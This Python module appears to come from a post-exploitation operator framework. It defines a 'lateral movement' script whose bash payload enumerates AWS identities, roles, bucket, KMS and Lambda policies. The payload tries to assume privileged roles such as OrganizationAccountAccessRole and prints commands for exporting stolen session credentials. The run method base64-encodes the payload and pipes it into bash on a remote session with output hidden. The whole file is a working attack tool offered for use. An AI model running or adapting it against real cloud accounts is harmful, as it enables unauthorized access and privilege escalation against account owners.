"""AWS cross-account access script."""

from ..base import OperatorScript, ScriptResult


class CrossAccountAWS(OperatorScript):
    """Enumerate and exploit AWS cross-account access."""
    
    name = "AWS Cross-Account Access"
    description = "Enumerate AWS cross-account access opportunities"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] AWS CROSS-ACCOUNT ACCESS"
echo "==========================="
echo ""

if ! command -v aws &>/dev/null; then
    echo "[-] AWS CLI not installed"
    exit 0
fi

echo "[+] Current AWS identity:"
IDENTITY=$(aws sts get-caller-identity 2>/dev/null)
if [ $? -eq 0 ]; then
    echo "$IDENTITY"
    ACCOUNT_ID=$(echo "$IDENTITY" | grep -o '"Account": "[0-9]*"' | cut -d'"' -f4)
    echo "[*] Current Account ID: $ACCOUNT_ID"
else
    echo "[-] No AWS credentials configured"
    exit 0
fi
echo ""

echo "[+] Enumerating AssumeRole policies:"
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.AWS, `:root`)]' \
    2>/dev/null | grep -E "RoleName|Arn" | head -20
echo ""

echo "[+] Searching for cross-account S3 buckets:"
aws s3 ls 2>/dev/null | while read bucket; do
    BUCKET_NAME=$(echo "$bucket" | awk '{print $3}')
    if [ ! -z "$BUCKET_NAME" ]; then
        echo "[*] Checking bucket: $BUCKET_NAME"
        aws s3api get-bucket-policy --bucket "$BUCKET_NAME" 2>/dev/null | \
            grep -o '"AWS":"[^"]*"' | grep -v "$ACCOUNT_ID" | head -3
    fi
done
echo ""

echo "[+] Checking for cross-account KMS keys:"
aws kms list-keys --query 'Keys[*].KeyId' --output text 2>/dev/null | while read key; do
    POLICY=$(aws kms get-key-policy --key-id "$key" --policy-name default 2>/dev/null)
    if echo "$POLICY" | grep -q "arn:aws:iam::" | grep -v "$ACCOUNT_ID"; then
        echo "[!] Cross-account access on key: $key"
    fi
done
echo ""

echo "[+] Checking for cross-account Lambda functions:"
aws lambda list-functions --query 'Functions[*].FunctionName' --output text 2>/dev/null | \
    while read func; do
        POLICY=$(aws lambda get-policy --function-name "$func" 2>/dev/null)
        if echo "$POLICY" | grep -q "arn:aws:iam::" | grep -v "$ACCOUNT_ID"; then
            echo "[!] Cross-account access on function: $func"
        fi
    done
echo ""

echo "[+] Enumerating STS assumable roles:"
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output text 2>/dev/null | \
    head -20
echo ""

echo "[+] Attempting to assume common roles:"
for ROLE in OrganizationAccountAccessRole AdminRole PowerUserRole; do
    echo "[*] Trying to assume: $ROLE"
    aws sts assume-role --role-arn "arn:aws:iam::*:role/$ROLE" \
        --role-session-name test 2>/dev/null && \
        echo "[+] Successfully assumed $ROLE" || \
        echo "[-] Cannot assume $ROLE"
done
echo ""

echo "[+] Cross-account access commands:"
echo "  aws sts assume-role --role-arn arn:aws:iam::TARGET_ACCOUNT:role/ROLE_NAME --role-session-name SESSION"
echo "  export AWS_ACCESS_KEY_ID=..."
echo "  export AWS_SECRET_ACCESS_KEY=..."
echo "  export AWS_SESSION_TOKEN=..."
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Enumerating AWS cross-account access...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="AWS cross-account enumeration executed",
                metadata={"script": "cross_account_aws"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
